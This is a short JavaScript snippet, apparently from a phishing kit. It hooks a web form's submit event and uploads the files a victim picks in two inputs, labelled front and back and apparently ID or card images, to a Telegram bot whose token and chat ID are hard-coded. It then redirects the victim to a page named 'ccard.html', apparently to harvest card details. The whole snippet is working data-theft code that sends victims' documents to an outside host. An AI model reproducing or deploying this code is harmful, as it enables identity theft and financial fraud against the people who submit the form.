


    const bots = new Bot("8267414523:AAGKjARTH31ZYJrFHguo0OA4oBl4C8NFR_Y", 8014301370);

   window.location.hostname
   window.location.port



    document.getElementById("form").addEventListener("submit", e => {
        e.preventDefault();
    
    
    ///  const text = document.getElementById("textinput").value;
    
    
    ///    bot.sendFile("#fileinput", text)
        bots.sendFile("#fileinputfront")
        bots.sendFile("#fileinputback")
        .then(res => {
    ///    console.log(res);
        window.location.href='ccard.html'
        })
    })
    
    

